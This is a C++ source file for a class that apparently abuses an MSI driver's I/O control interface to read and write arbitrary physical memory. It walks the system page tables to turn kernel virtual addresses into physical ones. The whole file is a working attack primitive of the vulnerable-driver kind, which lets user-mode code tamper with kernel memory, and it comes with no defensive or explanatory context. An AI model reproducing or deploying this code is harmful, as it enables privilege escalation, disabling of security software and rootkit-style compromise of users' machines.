#include "global.h"
#include "ntiomsi.h"

void ntiomsi::read (IN void* pFrom, OUT void* pDst, IN size_t size) {
	physaddr pSysPml4Base = ntGetPml4Base(funcptr(ioreadpa));
	physaddr pa           = getPa4lvl(pFrom, pSysPml4Base, funcptr(ioreadpa));
	ioreadpa(pa, pDst, size);
}

void ntiomsi::write (IN void* pFrom, IN void* pDst, IN size_t size, OUT void* pOld) {
	physaddr pSysPml4Base = ntGetPml4Base(funcptr(ioreadpa));
	physaddr pa           = getPa4lvl(pDst, pSysPml4Base, funcptr(ioreadpa));
	iowritepa(pFrom, pa, size, pOld);
}

void ntiomsi::ioreadpa (IN physaddr pFrom, OUT void* pDst, IN size_t size) {
	rwbuff buff {0};
	buff.pFrom       = pFrom;
	buff.blockLength = 1;
	buff.blockCount  = size;

	if (!DeviceIoControl(m_hDevice, CTL_READPA, &buff, sizeof(buff), &buff, sizeof(buff), nullptr, nullptr))
		error("ntiomsi readpa fail!");

	memcpy(pDst, &buff.wrBuff, size);
}

void ntiomsi::iowritepa (IN void* pFrom, IN physaddr pDst, IN size_t size, OUT void* pOld) {
	if (pOld)
		ioreadpa(pDst, pOld, size);

	rwbuff buff {0};
	buff.pDst        = pDst;
	buff.blockLength = 1;
	buff.blockCount  = size;
	memcpy(&buff.wrBuff, pFrom, size);

	if (!DeviceIoControl(m_hDevice, CTL_WRITEPA, &buff, sizeof(buff), &buff, sizeof(buff), nullptr, nullptr))
		error("ntiomsi writepa fail!");
}
